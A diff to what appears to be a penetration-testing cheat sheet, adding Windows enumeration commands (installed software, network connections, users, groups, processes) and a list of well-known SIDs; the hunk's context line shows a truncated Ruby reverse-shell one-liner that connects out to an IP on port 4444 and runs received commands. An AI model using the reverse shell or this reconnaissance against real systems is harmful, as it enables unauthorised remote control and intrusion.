@@ -57,9 +57,39 @@ ruby -rsocket -e 'c=TCPSocket.new("123.123.123.1","4444");while(cmd=c.gets);IO.p
 
 ----
 
-Well-known-SIDs:
+#Well-known-SIDs:
 S-1-0-0                       Nobody        
 S-1-1-0	                      Everybody
 S-1-5-11                      Authenticated Users
 S-1-5-18                      Local System
 S-1-5-domainidentifier-500    Administrator
+
+----
+
+#Get installed apps info:
+#64bit:
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+#32bit:
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+
+#List network connections
+netstat -aon
+#Show network interfaces
+ipconfig /all
+#Show routing table
+route print
+
+#System info
+syteminfo
+
+#User info
+whoami
+Get-LocalUser
+whoami /groups
+
+#Group info
+Get-LocalGroup
+Get-LocalGroupMember groupname
+
+#Process Info
+Get-Process
